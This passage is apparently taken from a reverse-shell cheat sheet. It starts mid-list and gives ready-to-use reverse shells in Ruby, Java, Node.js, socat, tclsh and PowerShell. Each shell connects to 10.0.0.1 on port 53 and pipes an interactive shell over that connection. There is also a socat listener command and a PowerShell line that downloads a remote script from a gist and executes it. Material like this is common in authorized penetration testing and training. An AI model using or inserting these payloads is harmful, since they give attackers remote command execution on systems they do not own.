    ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","53");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

Java
----

.. code-block:: java

    r = Runtime.getRuntime();
    p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/10.0.0.1/53;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
    p.waitFor();

Node.js
-------

.. code-block:: javascript

    (function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(53, "10.0.0.1", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();

socat
-----

Must use socat as the listener:

.. code-block:: none

    socat file:`tty`,raw,echo=0 tcp-listen:53

.. code-block:: none

    socat tcp-connect:10.0.0.1:53 exec:"sh -li",pty,stderr,setsid,sigint,sane


tclsh
-----

.. code-block:: tcl

    #!/usr/bin/tclsh
    set s [socket 10.0.0.1 53];
    while {42} {
    puts -nonewline $s "shell>";
    flush $s;
    gets $s c;
    set e "exec $c";
    if {![catch {set r [eval $e]} err]} {
    puts $s $r;
    }
    flush $s;
    }
    close $s;

.. code-block:: bash

    echo 'set s [socket 10.0.0.1 53];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh


Powershell
----------

.. code-block:: powershell

    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

.. code-block:: powershell

    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

.. code-block:: powershell

    powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
